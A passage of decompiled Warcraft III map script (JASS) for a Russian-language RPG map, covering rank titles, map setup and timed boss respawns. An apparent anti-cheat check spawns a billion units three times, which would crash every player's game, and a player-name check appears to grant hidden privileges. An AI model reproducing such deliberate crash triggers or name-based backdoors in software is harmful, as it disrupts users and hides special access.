elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=2300 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=2699 then
set TE[L9]=12
set VN[L9]="Лучший из худших (|c00ffff0012|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=1900 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=2299 then
set VN[L9]="Машина для убийств (|c00ffff0011|r)"
set TE[L9]=11
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=1600 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=1899 then
set TE[L9]=10
set VN[L9]="Просто Зверь (|c00ffff0010|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=1250 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=1599 then
set TE[L9]=9
set VN[L9]="Беспощадный (|c00ffff009|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=1000 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=1249 then
set TE[L9]=8
set VN[L9]="Командир (|c00ffff008|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=800 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=999 then
set VN[L9]="Крутой (|c00ffff007|r)"
set TE[L9]=7
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=600 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=799 then
set VN[L9]="Достойный (|c00ffff006|r)"
set TE[L9]=6
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=400 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=599 then
set VN[L9]="Опытный (|c00ffff005|r)"
set TE[L9]=5
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=250 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=399 then
set VN[L9]="Любитель (|c00ffff004|r)"
set TE[L9]=4
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=150 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=249 then
set VN[L9]="Что-то знающий (|c00ffff003|r)"
set TE[L9]=3
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=70 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=149 then
set VN[L9]="Освоившийся (|c00ffff002|r)"
set TE[L9]=2
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)>=20 and GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=69 then
set TE[L9]=1
set VN[L9]="Новичок (|c00ffff001|r)"
elseif GetPlayerState(Player(L9-1),PLAYER_STATE_RESOURCE_LUMBER)<=19 then
set VN[L9]="Нет звания"
endif
if S2[L9+10]==true then
if GetUnitLevel(MT[L9-1])>Tm[L9]+2 or GetHeroStr(MT[L9-1],false)>=10000 or GetHeroAgi(MT[L9-1],false)>=10000 or GetHeroInt(MT[L9-1],false)>=10000 or GetUnitState(MT[L9-1],UNIT_STATE_LIFE)>=250000 then
call UnitAddAbility(IQ,$41304659)
call CreateNUnitsAtLoc($3B9ACA00,$68706561,Player(PLAYER_NEUTRAL_AGGRESSIVE),GetRectCenter(GetPlayableMapRect()),bj_UNIT_FACING)
call CreateNUnitsAtLoc($3B9ACA00,$68706561,Player(PLAYER_NEUTRAL_AGGRESSIVE),GetRectCenter(GetPlayableMapRect()),bj_UNIT_FACING)
call CreateNUnitsAtLoc($3B9ACA00,$68706561,Player(PLAYER_NEUTRAL_AGGRESSIVE),GetRectCenter(GetPlayableMapRect()),bj_UNIT_FACING)
endif
endif
if MK>10 then
set MK=8
endif
if MK>=4 then
if not (GetPlayerName(Player(8))=="TCOM" or SubString(GetPlayerName(Player(0)),StringLength(GetPlayerName(Player(0)))-5,StringLength(GetPlayerName(Player(0)))-4)=="#") then
set MK=3
endif
endif
if GetUnitAbilityLevel(MT[L9-1],$41304B57)>=1 then
call SetUnitState(MT[L9-1],UNIT_STATE_LIFE,GetUnitState(MT[L9-1],UNIT_STATE_LIFE)+GetUnitAbilityLevel(MT[L9-1],$41304B57)*2)
endif
set Nt=1
loop
if Player(Nt-1)!=Player(L9-1) then
call SetPlayerAlliance(Player(Nt-1),Player(L9-1),ALLIANCE_SHARED_CONTROL,false)
endif
set Nt=Nt+1
exitwhen Nt>=9
endloop
if GetLocalPlayer()==Player(L9-1) then
call SetCameraField(CAMERA_FIELD_TARGET_DISTANCE,2000+GetUnitAbilityLevel(MT[L9-1],$41313041)*100,0)
endif
set L9=L9+1
exitwhen L9>8
endloop
endfunction
function oJ takes nothing returns nothing
local timer VL
local timer VM
local integer L9=1
local integer Mc
local integer VP=1
local timer No
local group Na
call Cheat("whosyourdaddy")
call SetPlayerName(Player(15),"noname")
set VL=CreateTimer()
set VM=CreateTimer()
call TimerStart(VL,.3,true,function oI)
call TimerStart(VM,90,true,function oH)
call StartTimerBJ(T8,true,.5)
loop
set Mc=1
loop
if Player(Mc-1)!=Player(L9-1) then
if GetPlayerSlotState(Player(Mc-1))==PLAYER_SLOT_STATE_PLAYING then
if GetPlayerController(Player(Mc-1))==MAP_CONTROL_USER then
if GetPlayerName(Player(Mc-1))==GetPlayerName(Player(L9-1)) then
call CustomDefeatBJ(Player(Mc-1),"!!!")
endif
endif
endif
endif
set Mc=Mc+1
exitwhen Mc>8
endloop
if GetLocalPlayer()==Player(L9-1) then
call SetCameraField(CAMERA_FIELD_TARGET_DISTANCE,2000,0)
endif
set L9=L9+1
exitwhen L9>8
endloop
call SetPlayerFlagBJ(PLAYER_STATE_GIVES_BOUNTY,false,Player(PLAYER_NEUTRAL_AGGRESSIVE))
call CameraSetSmoothingFactor(0)
call ResetTerrainFog()
call FogMaskEnable(true)
call FogEnable(true)
call SetMapFlag(MAP_FOG_HIDE_TERRAIN,true)
call SetMapFlag(MAP_LOCK_RESOURCE_TRADING,false)
call SetMapFlag(MAP_RESOURCE_TRADING_ALLIES_ONLY,true)
call SetMapFlag(MAP_LOCK_ALLIANCE_CHANGES,false)
call SetPlayerHandicap(Player(PLAYER_NEUTRAL_AGGRESSIVE),300*.01)
call SetPlayerHandicap(Player(11),400*.01)
call SetPlayerHandicap(Player(10),400*.01)
call SetPlayerAllianceStateBJ(Player(11),Player(PLAYER_NEUTRAL_AGGRESSIVE),bj_ALLIANCE_ALLIED_UNITS)
call SetPlayerAllianceStateBJ(Player(PLAYER_NEUTRAL_AGGRESSIVE),Player(11),bj_ALLIANCE_ALLIED_UNITS)
call SetPlayerAllianceStateBJ(Player(10),Player(PLAYER_NEUTRAL_AGGRESSIVE),bj_ALLIANCE_ALLIED_UNITS)
call SetPlayerAllianceStateBJ(Player(PLAYER_NEUTRAL_AGGRESSIVE),Player(10),bj_ALLIANCE_ALLIED_UNITS)
call SetPlayerAllianceStateBJ(Player(10),Player(11),bj_ALLIANCE_ALLIED_UNITS)
call SetPlayerAllianceStateBJ(Player(11),Player(10),bj_ALLIANCE_ALLIED_UNITS)
set TR[1]=0
set TR[2]=0
set VO=0
set OE[0]=GetPlayerName(Player(0))
set OE[1]=GetPlayerName(Player(1))
set OE[2]=GetPlayerName(Player(2))
set OE[3]=GetPlayerName(Player(3))
set OE[4]=GetPlayerName(Player(4))
set OE[5]=GetPlayerName(Player(5))
set OE[6]=GetPlayerName(Player(6))
set OE[7]=GetPlayerName(Player(7))
set OD[0]="|c00ff0000"
set OD[1]="|cFF0080FF"
set OD[2]="|c0000ffff"
set OD[3]="|c00ff00ff"
set OD[4]="|c00ffff00"
set OD[5]="|c00ff7f00"
set OD[6]="|c0000ff00"
set OD[7]="|c00ff9696"
loop
set Su[VP]=false
set Sr[VP]=true
set T2[VP]=true
set T4[VP]=true
set TQ[VP]=1.
set N0[VP]=1.
set Nd[VP]=1.
set Nf[VP]=1.
set Ng[VP]=1.
set Sq[VP]=0
set Ro[VP]=0
set Rp[VP]=0
set Rp[VP+10]=0
set S2[VP]=true
set VQ[VP-1]=false
call SetPlayerFlagBJ(PLAYER_STATE_GIVES_BOUNTY,false,Player(VP-1))
set Nx[VP-1]=0
set VP=VP+1
exitwhen VP>8
endloop
set Rq[1]=0
set Rq[2]=0
set VR[4]=ID
set VR[5]=Hx
set VR[6]=IF
set VR[7]=IE
call CreateTextTagLocBJ("1-5 LvL",GetUnitLoc(JD),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("6-10 LvL",GetUnitLoc(IZ),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("11-15 LvL",GetUnitLoc(JZ),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("16-20 LvL",GetUnitLoc(Jc),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("21-25 LvL",GetUnitLoc(Jd),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("26-30 LvL",GetUnitLoc(Jg),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("31-35 LvL",GetUnitLoc(Jh),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("46-50 LvL",GetUnitLoc(Jk),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("36-40 LvL",GetUnitLoc(Jp),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("41-45 LvL",GetUnitLoc(Jr),0,15.,0.,100,100,0)
call CreateTextTagLocBJ("50+ LvL",GetUnitLoc(Iu),0,15.,0.,100,100,0)
call UnitDamageTarget(Kf,Kf,700,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
if GetUnitState(Kf,UNIT_STATE_LIFE)>.405 then
set No=CreateTimer()
call TimerStart(No,.0001,true,function oF)
endif
call PauseUnit(JD,true)
call SetUnitPosition(Js,8683,-10270)
call PauseUnit(IZ,true)
call PauseUnit(JZ,true)
call PauseUnit(Jc,true)
call PauseUnit(Jd,true)
call PauseUnit(Jg,true)
call PauseUnit(Jh,true)
call PauseUnit(Jp,true)
call PauseUnit(Jr,true)
call PauseUnit(Jk,true)
call PauseUnit(Iu,true)
call ShowUnit(Io,false)
call ShowUnit(Lz,false)
call ShowUnit(KB,false)
call ShowUnit(LI,false)
call PauseUnit(LI,true)
call ShowUnit(LJ,false)
call PauseUnit(LJ,true)
call ShowUnit(J8,false)
call ShowUnit(Jb,false)
call ShowUnit(LB,false)
call SetUnitLifeBJ(KM,1.)
call ShowUnit(ID,false)
call SetUnitInvulnerable(K4,true)
call ShowUnit(Lx,false)
call PauseUnit(Lx,true)
call SetUnitInvulnerable(LF,true)
call PauseUnit(LF,true)
call SetUnitInvulnerable(LE,true)
call PauseUnit(LE,true)
call SetUnitInvulnerable(Ky,true)
call SetUnitInvulnerable(Ld,true)
call SetUnitInvulnerable(LT,true)
call SetUnitInvulnerable(LV,true)
call SetUnitInvulnerable(Kz,true)
call PauseUnit(Kz,true)
call ShowUnit(IL,false)
call PauseUnit(LT,true)
call PauseUnit(Ld,true)
call PauseUnit(LH,true)
call PauseUnit(LV,true)
call PauseUnit(Ky,true)
call PauseUnit(Lf,true)
call ShowUnit(Lf,false)
call PauseUnit(Lb,true)
call ShowUnit(Lb,false)
call PauseUnit(La,true)
call ShowUnit(La,false)
call PauseUnit(LZ,true)
call ShowUnit(LZ,false)
call PauseUnit(Lc,true)
call ShowUnit(Lc,false)
call PauseUnit(Le,true)
call ShowUnit(Le,false)
call PauseUnit(LY,true)
call ShowUnit(LY,false)
call PauseUnit(Lg,true)
call ShowUnit(Lg,false)
call SetUnitInvulnerable(Jr,true)
call SetUnitInvulnerable(Jp,true)
call SetUnitInvulnerable(Jk,true)
call SetUnitInvulnerable(Jh,true)
call SetUnitInvulnerable(Jg,true)
call SetUnitInvulnerable(Jd,true)
call SetUnitInvulnerable(Jc,true)
call SetUnitInvulnerable(JZ,true)
call SetUnitInvulnerable(IZ,true)
call SetUnitInvulnerable(JD,true)
call SetUnitInvulnerable(Iu,true)
call ShowUnit(H6,false)
call ShowUnit(H7,false)
call ShowUnit(IH,false)
call ShowUnit(H9,false)
call ShowUnit(IB,false)
call ShowUnit(II,false)
call PauseUnit(Lm,true)
call SetUnitInvulnerable(Lm,true)
call SetUnitInvulnerable(Lr,true)
call SetUnitInvulnerable(Lo,true)
call SetUnitInvulnerable(Ls,true)
call ShowUnit(L3,false)
call ShowUnit(L1,false)
call ShowUnit(L2,false)
call ShowUnit(L0,false)
call ShowUnit(LP,false)
call SetUnitInvulnerable(LP,true)
call SetDoodadAnimationRectBJ("Stand Work",$44303355,GetPlayableMapRect())
call SetUnitAnimation(IK,"Stand Work")
call SetUnitAnimation(KU,"Stand Channel")
call ModifyGateBJ(bj_GATEOPERATION_CLOSE,HX)
call ShowDestructable(HX,false)
call SetDestructableInvulnerableBJ(Ho,true)
call SetDestructableInvulnerableBJ(Hq,true)
call SetDestructableInvulnerableBJ(HG,true)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FC)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Gd)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,BD)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FJ)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FI)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FK)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,GI)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,J)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,EN)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Cs)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,EO)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,x)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Dj)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,CM)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,DT)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Fm)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,B7)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Gz)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Gx)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,D6)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,ED)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,DL)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FG)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FE)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Ey)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FH)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,EK)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,Ed)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FL)
call CreateFogModifierRectBJ(true,Player(11),FOG_OF_WAR_VISIBLE,FX)
set TH=GetRandomInt(1,5)
if TH==1 then
call EnableTrigger(VS)
endif
if TH==2 then
call EnableTrigger(VT)
endif
if TH==3 then
call EnableTrigger(VU)
endif
if TH==4 then
call EnableTrigger(VV)
endif
if TH==5 then
call EnableTrigger(VW)
endif
call BJDebugMsg("|c00ffff00Для того, чтобы выбрать героя, выберите его и нажмите|r |c00ff0000Esc")
set Na=CreateGroup()
call GroupEnumUnitsInRect(Na,Go,null)
call ForGroup(Na,function oG)
call DestroyGroup(Na)
set Na=null
call TriggerSleepAction(300.)
call BJDebugMsg("|c00ffff00Alt|r + |c00ffff00H|r - полезная информация")
call BJDebugMsg("|c00ffff00Alt|r + |c00ffff00H|r - полезная информация")
call BJDebugMsg("|c00ffff00Alt|r + |c00ffff00H|r - полезная информация")
call BJDebugMsg("|c00ffff00Alt|r + |c00ffff00H|r - полезная информация")
set No=null
set VM=null
set VL=null
endfunction
function oK takes nothing returns nothing
local trigger VK=CreateTrigger()
call TriggerRegisterTimerEvent(VK,1,false)
call TriggerAddAction(VK,function oJ)
set VK=null
endfunction
function oL takes nothing returns nothing
call RemoveItem(GetEnumItem())
endfunction
function oM takes nothing returns nothing
local integer Mc
local integer No
call SaveInteger(Vc,GetHandleId(GetExpiredTimer()),1,LoadInteger(Vc,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Vc,GetHandleId(GetExpiredTimer()),1)<=1 then
set Mc=LoadInteger(Vc,GetHandleId(GetExpiredTimer()),4)
if LoadInteger(Vc,GetHandleId(GetExpiredTimer()),4)>=0 then
set Vd[Mc]=CreateUnit(Player(11),LoadInteger(Vc,GetHandleId(GetExpiredTimer()),0),LoadReal(Vc,GetHandleId(GetExpiredTimer()),2),LoadReal(Vc,GetHandleId(GetExpiredTimer()),3),180.)
else
call CreateUnit(Player(11),LoadInteger(Vc,GetHandleId(GetExpiredTimer()),0),LoadReal(Vc,GetHandleId(GetExpiredTimer()),2),LoadReal(Vc,GetHandleId(GetExpiredTimer()),3),180.)
endif
call BJDebugMsg(GetObjectName(LoadInteger(Vc,GetHandleId(GetExpiredTimer()),0))+" |c0000ffff снова доступен для сражения!")
set No=0
loop
call EnableTrigger(LoadTriggerHandle(Vc,GetHandleId(GetExpiredTimer()),10+No))
call DisableTrigger(LoadTriggerHandle(Vc,GetHandleId(GetExpiredTimer()),20+No))
set No=No+1
exitwhen No==9
endloop
call EnumItemsInRectBJ(LoadRectHandle(Vc,GetHandleId(GetExpiredTimer()),5),function oL)
call RemoveSavedInteger(Vc,GetHandleId(GetExpiredTimer()),4)
call RemoveSavedInteger(Vc,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Vc,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedReal(Vc,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedReal(Vc,GetHandleId(GetExpiredTimer()),3)
set No=0
loop
call RemoveSavedHandle(Vc,GetHandleId(GetExpiredTimer()),10+No)
call RemoveSavedHandle(Vc,GetHandleId(GetExpiredTimer()),20+No)
set No=No+1
exitwhen No==9
endloop
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endfunction
function oN takes real MD,real ME,real VZ returns nothing
local unit Va=CreateUnit(Player(8),$68303739,MD,ME,270.)
call AddSpecialEffectTarget("war3mapImported\\clockwisetimer.mdl",Va,"origin")
call SetUnitScale(Va,2.,2.,2.)
call SetUnitTimeScale(Va,.03)
call nD(Va,VZ)
set Va=null
endfunction
function oO takes nothing returns nothing
local unit VY=GetTriggerUnit()
local timer Vb
if GetOwningPlayer(VY)==Player(11) then
if GetUnitTypeId(VY)==$6E30324E then
call oN(-9115,-12155,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-9115)
call SaveReal(Vc,GetHandleId(Vb),3,-12155)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6530304C then
call oN(-6637,1916,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-6637)
call SaveReal(Vc,GetHandleId(Vb),3,1916)
call SaveRectHandle(Vc,GetHandleId(Vb),5,Gp)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E303048 then
call oN(-10115,-6520,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-10115)
call SaveReal(Vc,GetHandleId(Vb),3,-6520)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$75303030 then
call EnableTrigger(Ve)
call DisableTrigger(Vf)
call oN(-14160,-13550,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-14160)
call SaveReal(Vc,GetHandleId(Vb),3,-13550)
call SaveRectHandle(Vc,GetHandleId(Vb),5,Rect(-16220,-13800,-13820,-13230))
call SaveTriggerHandle(Vc,GetHandleId(Vb),10,Vf)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$68303035 then
call oN(-5167,-2849,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-5167)
call SaveReal(Vc,GetHandleId(Vb),3,-2849)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$65303049 then
call oN(-15860,-16050,450)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,90)
call SaveReal(Vc,GetHandleId(Vb),2,-15860)
call SaveReal(Vc,GetHandleId(Vb),3,-16050)
call SaveRectHandle(Vc,GetHandleId(Vb),5,Rect(-16280,-16333,-14800,-14970))
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6830344F then
call oN(2750,-9540,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,2750)
call SaveReal(Vc,GetHandleId(Vb),3,-9540)
call SaveInteger(Vc,GetHandleId(Vb),4,0)
call SaveRectHandle(Vc,GetHandleId(Vb),5,Rect(1750,-10200,3240,-9160))
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$7530304C then
call DisableTrigger(Vg)
call oN(-15750,10300,500)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,100)
call SaveReal(Vc,GetHandleId(Vb),2,-15750)
call SaveReal(Vc,GetHandleId(Vb),3,10300)
call SaveInteger(Vc,GetHandleId(Vb),4,1)
call SaveRectHandle(Vc,GetHandleId(Vb),5,EN)
call SaveTriggerHandle(Vc,GetHandleId(Vb),10,Vg)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$7530304A then
call DisableTrigger(Vh)
call oN(-15750,12380,500)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,100)
call SaveReal(Vc,GetHandleId(Vb),2,-15750)
call SaveReal(Vc,GetHandleId(Vb),3,12380)
call SaveInteger(Vc,GetHandleId(Vb),4,2)
call SaveRectHandle(Vc,GetHandleId(Vb),5,EO)
call SaveTriggerHandle(Vc,GetHandleId(Vb),10,Vh)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E303231 then
call oN(1640,12000,500)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,100)
call SaveReal(Vc,GetHandleId(Vb),2,1640)
call SaveReal(Vc,GetHandleId(Vb),3,12000)
call SaveInteger(Vc,GetHandleId(Vb),4,3)
call SaveRectHandle(Vc,GetHandleId(Vb),5,CY)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E303338 then
call DisableTrigger(Vi)
call oN(8714,7850,500)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,100)
call SaveReal(Vc,GetHandleId(Vb),2,8714)
call SaveReal(Vc,GetHandleId(Vb),3,7850)
call SaveInteger(Vc,GetHandleId(Vb),4,4)
call SaveRectHandle(Vc,GetHandleId(Vb),5,FG)
call SaveTriggerHandle(Vc,GetHandleId(Vb),10,Vi)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E6D6764 then
call oN(24000,15100,550)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,110)
call SaveReal(Vc,GetHandleId(Vb),2,24000)
call SaveReal(Vc,GetHandleId(Vb),3,15100)
call SaveInteger(Vc,GetHandleId(Vb),4,5)
call SaveRectHandle(Vc,GetHandleId(Vb),5,Rect(22750,12900,24400,15650))
call SaveTriggerHandle(Vc,GetHandleId(Vb),10,Vj)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E30304B then
call oN(-9780,-14830,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-9780)
call SaveReal(Vc,GetHandleId(Vb),3,-14830)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E30304C then
call oN(-10336,-11830,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-10336)
call SaveReal(Vc,GetHandleId(Vb),3,-11830)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E30304D then
call oN(-3870,-10350,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-3870)
call SaveReal(Vc,GetHandleId(Vb),3,-10350)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E303051 then
call oN(-2440,-11313,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,-2440)
call SaveReal(Vc,GetHandleId(Vb),3,-11313)
call TimerStart(Vb,5,true,function oM)
elseif GetUnitTypeId(VY)==$6E303530 then
call oN(600,-4870,400)
set Vb=CreateTimer()
call SaveInteger(Vc,GetHandleId(Vb),0,GetUnitTypeId(VY))
call SaveInteger(Vc,GetHandleId(Vb),1,80)
call SaveReal(Vc,GetHandleId(Vb),2,600)
call SaveReal(Vc,GetHandleId(Vb),3,-4870)
call TimerStart(Vb,5,true,function oM)
endif
endif
set VY=null
set Vb=null
endfunction
function oP takes nothing returns nothing
local trigger VX=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(VX,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(VX,function oO)
set VX=null
endfunction
function oQ takes nothing returns nothing
call SetItemDroppable(LoadItemHandle(PP,GetHandleId(GetExpiredTimer()),10),true)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),10)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function oR takes nothing returns nothing
if GetUnitAbilityLevel(Pq,$4131424B)==1 then
set Nu=GetHeroStr(Pq,true)*2
elseif GetUnitAbilityLevel(Pq,$4131424B)==2 then
set Nu=GetHeroStr(Pq,true)*3
endif
call m1(Pq,GetEnumUnit(),Nu)
call IssueTargetOrder(GetEnumUnit(),"attack",Pq)
set Pq=null
endfunction
function oS takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),10)
local group Mc
local boolexpr No
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),1,LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)==0 then
call UnitRemoveAbility(Hu,$4131424B)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),10)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
else
set Mc=CreateGroup()
set No=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetUnitX(Hu),GetUnitY(Hu),300,No)
call DestroyBoolExpr(No)
set Pq=Hu
call ForGroup(Mc,function oR)
call DestroyGroup(Mc)
set No=null
set Mc=null
endif
set Hu=null
endfunction
function oT takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local integer Vl=LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)
local integer Vm=LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)
